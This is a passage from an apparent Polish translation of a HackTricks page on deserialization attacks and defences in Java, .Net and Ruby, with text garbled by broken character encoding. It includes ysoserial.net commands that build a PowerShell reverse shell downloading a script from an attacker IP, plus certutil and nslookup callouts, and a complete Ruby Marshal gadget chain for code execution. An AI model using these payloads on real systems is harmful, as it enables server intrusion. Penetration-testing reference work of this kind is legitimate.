* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Dlaczego

Java u偶ywa du偶o serializacji do r贸偶nych cel贸w, takich jak:

* **Zapytania HTTP**: Serializacja jest powszechnie stosowana w zarzdzaniu parametrami, ViewState, ciasteczkami, itp.
* **RMI (Remote Method Invocation)**: Protok贸 Java RMI, kt贸ry w caoci polega na serializacji, jest podstaw komunikacji zdalnej w aplikacjach Java.
* **RMI przez HTTP**: Ta metoda jest powszechnie u偶ywana przez aplikacje internetowe oparte na grubej warstwie klienckiej w Javie, wykorzystujc serializacj do komunikacji obiekt贸w.
* **JMX (Java Management Extensions)**: JMX wykorzystuje serializacj do przesyania obiekt贸w przez sie.
* **Niestandardowe protokoy**: W Javie standardow praktyk jest przesyanie surowych obiekt贸w Javy, co zostanie zademonstrowane w nadchodzcych przykadach wykorzystania.

### Zapobieganie

#### Obiekty przejciowe

Klasa implementujca `Serializable` mo偶e oznaczy jako `transient` dowolny obiekt wewntrz klasy, kt贸ry nie powinien by serializowany. Na przykad:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Unikaj serializacji klasy, kt贸ra musi implementowa interfejs Serializable

W sytuacjach, gdy pewne **obiekty musz implementowa interfejs `Serializable`** ze wzgldu na hierarchi klas, istnieje ryzyko niezamierzonej deserializacji. Aby temu zapobiec, upewnij si, 偶e te obiekty nie mog by deserializowane poprzez zdefiniowanie metody `final` `readObject()`, kt贸ra konsekwentnie zgasza wyjtek, jak pokazano poni偶ej:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Poprawa bezpieczestwa deserializacji w Javie**

Dostosowywanie `java.io.ObjectInputStream` jest praktycznym podejciem do zabezpieczania proces贸w deserializacji. Ta metoda jest odpowiednia, gdy:

* Kod deserializacji jest pod kontrol.
* Klasy oczekiwane do deserializacji s znane.

Zastp metod **`resolveClass()`** w celu ograniczenia deserializacji tylko do dozwolonych klas. Zapobiega to deserializacji dowolnej klasy opr贸cz tych, kt贸re s wyra藕nie zezwolone, jak w poni偶szym przykadzie, kt贸ry ogranicza deserializacj tylko do klasy `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Korzystanie z agenta Java w celu poprawy bezpieczestwa** oferuje rozwizanie awaryjne, gdy modyfikacja kodu nie jest mo偶liwa. Ta metoda dotyczy g贸wnie **czarnolistowania szkodliwych klas**, korzystajc z parametru JVM:
```
-javaagent:name-of-agent.jar
```
Zapewnia spos贸b na dynamiczne zabezpieczenie deserializacji, idealny do rodowisk, w kt贸rych natychmiastowe zmiany w kodzie s praktycznie niemo偶liwe.

Sprawd藕 przykad w [rO0 autorstwa Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Wdra偶anie filtr贸w serializacji**: Java 9 wprowadzia filtry serializacji za porednictwem interfejsu **`ObjectInputFilter`**, zapewniajc pot偶ny mechanizm okrelania kryteri贸w, kt贸re musz spenia zserializowane obiekty przed ich deserializacj. Filtry te mog by stosowane globalnie lub na poziomie strumienia, oferujc precyzyjn kontrol nad procesem deserializacji.

Aby skorzysta z filtr贸w serializacji, mo偶na ustawi filtr globalny, kt贸ry bdzie stosowany do wszystkich operacji deserializacji lub skonfigurowa go dynamicznie dla konkretnych strumieni. Na przykad:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Wykorzystanie zewntrznych bibliotek w celu zwikszenia bezpieczestwa**: Biblioteki takie jak **NotSoSerial**, **jdeserialize** i **Kryo** oferuj zaawansowane funkcje do kontroli i monitorowania deserializacji w Javie. Te biblioteki mog zapewni dodatkowe warstwy bezpieczestwa, takie jak tworzenie listy dozwolonych lub zabronionych klas, analizowanie obiekt贸w zserializowanych przed deserializacj oraz implementowanie niestandardowych strategii serializacji.

* **NotSoSerial** przechwytuje procesy deserializacji w celu zapobiegania wykonaniu niezaufanego kodu.
* **jdeserialize** umo偶liwia analiz obiekt贸w zserializowanych w Javie bez ich deserializacji, pomagajc zidentyfikowa potencjalnie zoliwe treci.
* **Kryo** to alternatywny framework serializacji, kt贸ry kadzie nacisk na szybko i wydajno, oferujc konfigurowalne strategie serializacji, kt贸re mog zwikszy bezpieczestwo.

### Odnoniki

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Prezentacja na temat deserializacji i ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Prezentacja na temat gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) oraz slajdy: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Artyku na temat Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Artyku na temat deserializacji JSON w Java i .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacja: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) oraz slajdy: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVE dotyczce deserializacji: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Wstrzykiwanie JNDI i log4Shell

Dowiedz si, co to jest **Wstrzykiwanie JNDI, jak je nadu偶ywa za pomoc RMI, CORBA & LDAP oraz jak wykorzysta log4shell** (oraz przykad tej podatnoci) na nastpujcej stronie:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) API to Java API middleware do przesyania wiadomoci midzy dwoma lub wicej klientami. Jest to implementacja do rozwizania problemu producenta-konsumenta. JMS jest czci Java Platform, Enterprise Edition (Java EE) i zosta zdefiniowany przez specyfikacj opracowan w Sun Microsystems, ale obecnie jest kierowany przez Java Community Process. Jest to standard komunikacji, kt贸ry pozwala komponentom aplikacji opartym na Java EE tworzy, wysya, odbiera i czyta wiadomoci. Umo偶liwia komunikacj midzy r贸偶nymi komponentami rozproszonej aplikacji w spos贸b lu藕no powizany, niezawodny i asynchroniczny. (Z [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkty

Istnieje kilka produkt贸w wykorzystujcych to oprogramowanie poredniczce do wysyania wiadomoci:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Wykorzystanie

W zasadzie istnieje **szereg usug wykorzystujcych JMS w niebezpieczny spos贸b**. Dlatego jeli masz **wystarczajce uprawnienia** do wysyania wiadomoci do tych usug (zazwyczaj bdziesz potrzebowa wa偶nych powiadcze), mo偶esz wysa **zserializowane obiekty zoliwe, kt贸re zostan zdeserializowane przez odbiorc/subskrybenta**.\
Oznacza to, 偶e w tej eksploatacji wszyscy **klienci korzystajcy z tej wiadomoci zostan zainfekowani**.

Nale偶y pamita, 偶e nawet jeli usuga jest podatna (poniewa偶 niebezpiecznie deserializuje dane wejciowe u偶ytkownika), nadal musisz znale藕 wa偶ne gad偶ety do wykorzystania podatnoci.

Narzdzie [JMET](https://github.com/matthiaskaiser/jmet) zostao stworzone do **poczenia i ataku na te usugi, wysyajc wiele zserializowanych obiekt贸w zoliwych za pomoc znanych gad偶et贸w**. Te eksploity zadziaaj, jeli usuga nadal jest podatna i jeli kt贸rykolwiek z u偶ytych gad偶et贸w znajduje si w podatnej aplikacji.

### Odnoniki

* Prezentacja JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slajdy: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

W kontekcie .Net, eksploatacje deserializacji dziaaj podobnie jak te znalezione w Javie, gdzie gad偶ety s wykorzystywane do uruchamiania okrelonego kodu podczas deserializacji obiektu.
### Odcisk palca

#### WhiteBox

Kod 藕r贸dowy powinien by sprawdzony pod ktem wystpie:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Nale偶y skupi si na serializatorach, kt贸re pozwalaj okreli typ za pomoc zmiennej kontrolowanej przez u偶ytkownika.

#### BlackBox

Wyszukiwanie powinno by skierowane na zakodowany w Base64 cig **AAEAAAD/////** lub podobny wzorzec, kt贸ry mo偶e zosta poddany deserializacji po stronie serwera, umo偶liwiajc kontrol nad typem do deserializacji. Mo偶e to obejmowa, ale nie ogranicza si do struktur **JSON** lub **XML** zawierajcych `TypeObject` lub `$type`.

### ysoserial.net

W tym przypadku mo偶na skorzysta z narzdzia [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) w celu **tworzenia exploit贸w deserializacji**. Po pobraniu repozytorium git nale偶y **skompilowa narzdzie** przy u偶yciu na przykad Visual Studio.

Jeli chcesz dowiedzie si, **jak ysoserial.net tworzy swoje exploity**, mo偶esz [**sprawdzi t stron, gdzie wyjaniono gad偶et ObjectDataProvider + ExpandedWrapper + formatujcy Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

G贸wne opcje **ysoserial.net** to: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** su偶y do wskazania gad偶etu do wykorzystania (wskazuje klas/funkcj, kt贸ra bdzie wykorzystana podczas deserializacji do wykonania polece).
* **`--formatter`**, su偶y do wskazania metody serializacji exploitu (musisz wiedzie, kt贸ra biblioteka jest u偶ywana po stronie serwera do deserializacji adunku i u偶y tej samej do jego serializacji)
* **`--output`** su偶y do wskazania, czy chcesz exploit w formacie **surowym** czy **zakodowanym w Base64**. _Zauwa偶, 偶e **ysoserial.net** zakoduje adunek za pomoc **UTF-16LE** (domylne kodowanie w systemie Windows), wic jeli otrzymasz surowy i po prostu zakodujesz go z konsoli Linux, mo偶esz napotka problemy z **zgodnoci kodowania**, kt贸re uniemo偶liwi poprawne dziaanie exploitu (w HTB JSON box adunek dziaa zar贸wno w UTF-16LE, jak i ASCII, ale to nie oznacza, 偶e zawsze bdzie dziaa)._
* **`--plugin`** ysoserial.net obsuguje wtyczki do tworzenia **exploit贸w dla konkretnych framework贸w** jak ViewState

#### Dodatkowe parametry ysoserial.net

* `--minify` dostarczy **mniejszego adunku** (jeli to mo偶liwe)
* `--raf -f Json.Net -c "anything"` To wska偶e wszystkie gad偶ety, kt贸re mo偶na u偶y z podanym formatowaniem (`Json.Net` w tym przypadku)
* `--sf xml` mo偶esz **wskaza gad偶et** (`-g`) i ysoserial.net bdzie szuka formatownik贸w zawierajcych "xml" (bez uwzgldniania wielkoci liter)

Przykady **exploit贸w ysoserial** do tworzenia:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ma r贸wnie偶 **bardzo interesujcy parametr**, kt贸ry pomaga lepiej zrozumie, jak dziaa ka偶dy exploit: `--test`\
Jeli wskazujesz ten parametr, **ysoserial.net** bdzie **pr贸bowa** exploit lokalnie, dziki czemu mo偶esz przetestowa, czy tw贸j payload bdzie dziaa poprawnie.\
Ten parametr jest pomocny, poniewa偶 po przejrzeniu kodu znajdziesz fragmenty kodu takie jak ten (z [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
To oznacza, 偶e w celu przetestowania exploitu kod wywoa [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
W **poprzednim kodzie jest podatny na stworzony exploit**. Jeli wic znajdziesz co podobnego w aplikacji .Net, oznacza to prawdopodobnie, 偶e ta aplikacja r贸wnie偶 jest podatna.\
Dlatego parametr **`--test`** pozwala nam zrozumie, **kt贸re fragmenty kodu s podatne** na exploit deserializacji, kt贸ry mo偶e stworzy **ysoserial.net**.

### ViewState

Zajrzyj do [tego POSTa dotyczcego **pr贸by wykorzystania parametru \_\_ViewState w .Net**](exploiting-\_\_viewstate-parameter.md) do **wykonania arbitralnego kodu**. Jeli **znasz ju偶 tajemnice** u偶ywane przez maszyn ofiary, [**przeczytaj ten post, aby dowiedzie si, jak wykona kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Zapobieganie

Aby zmniejszy ryzyko zwizane z deserializacj w .Net:

* **Unikaj pozwalania strumieniom danych na definiowanie typ贸w obiekt贸w.** Korzystaj z `DataContractSerializer` lub `XmlSerializer`, gdy to mo偶liwe.
* **Dla `JSON.Net`, ustaw `TypeNameHandling` na `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Unikaj u偶ywania `JavaScriptSerializer` z `JavaScriptTypeResolver`.**
* **Ogranicz typy, kt贸re mog by deserializowane**, rozumiejc zwizane z nimi ryzyka, takie jak `System.IO.FileInfo`, kt贸ry mo偶e modyfikowa waciwoci plik贸w serwera, potencjalnie prowadzc do atak贸w typu odmowa usugi.
* **Bd藕 ostro偶ny z typami posiadajcymi ryzykowne waciwoci**, jak `System.ComponentModel.DataAnnotations.ValidationException` z jego waciwoci `Value`, kt贸ra mo偶e by wykorzystana.
* **Bezpiecznie kontroluj instancjonowanie typ贸w**, aby zapobiec wpywaniu atakujcych na proces deserializacji, czynic nawet `DataContractSerializer` lub `XmlSerializer` podatnymi.
* **Wprowad藕 kontrol biaej listy** za pomoc niestandardowego `SerializationBinder` dla `BinaryFormatter` i `JSON.Net`.
* **Bd藕 na bie偶co z znanymi niebezpiecznymi gad偶etami deserializacji** w .Net i upewnij si, 偶e deserializatory nie instancjonuj takich typ贸w.
* **Izoluj potencjalnie ryzykowny kod** od kodu z dostpem do internetu, aby unikn ujawnienia znanych gad偶et贸w, takich jak `System.Windows.Data.ObjectDataProvider` w aplikacjach WPF, dla niezaufanych 藕r贸de danych.

### **Referencje**

* Dokument na temat deserializacji JSON w Java i .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacja: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) oraz slajdy: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

W Ruby, serializacja jest uatwiona przez dwie metody w bibliotece **marshal**. Pierwsza metoda, znana jako **dump**, su偶y do przeksztacenia obiektu w strumie bajt贸w. Proces ten nazywany jest serializacj. Z kolei druga metoda, **load**, su偶y do przywr贸cenia strumienia bajt贸w do obiektu, proces ten nazywany jest deserializacj.

Dla zabezpieczenia zserializowanych obiekt贸w, **Ruby wykorzystuje HMAC (Hash-Based Message Authentication Code)**, zapewniajc integralno i autentyczno danych. Klucz u偶ywany w tym celu jest przechowywany w jednym z kilku mo偶liwych miejsc:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**acuch gad偶et贸w deserializacji do RCE w Ruby 2.X (wicej informacji na** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Inny acuch RCE do wykorzystania w Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Metoda Ruby .send()

Jak wyjaniono w [**tym raporcie o podatnoci**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), jeli niezabezpieczone dane u偶ytkownika docieraj do metody `.send()` obiektu ruby, ta metoda pozwala na **wywoanie dowolnej innej metody** obiektu z dowolnymi parametrami.

Na przykad, wywoanie eval, a nastpnie kodu ruby jako drugiego parametru pozwoli na wykonanie arbitralnego kodu:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

 Ponadto, jeli tylko jeden parametr **`.send()`** jest kontrolowany przez atakujcego, jak wspomniano wczeniej, mo偶liwe jest wywoanie dowolnej metody obiektu, kt贸ra **nie wymaga argument贸w** lub kt贸rych argumenty maj **wartoci domylne**.\
W tym celu mo偶na wyliczy wszystkie metody obiektu, aby **znale藕 interesujce metody speniajce te wymagania**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF** sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
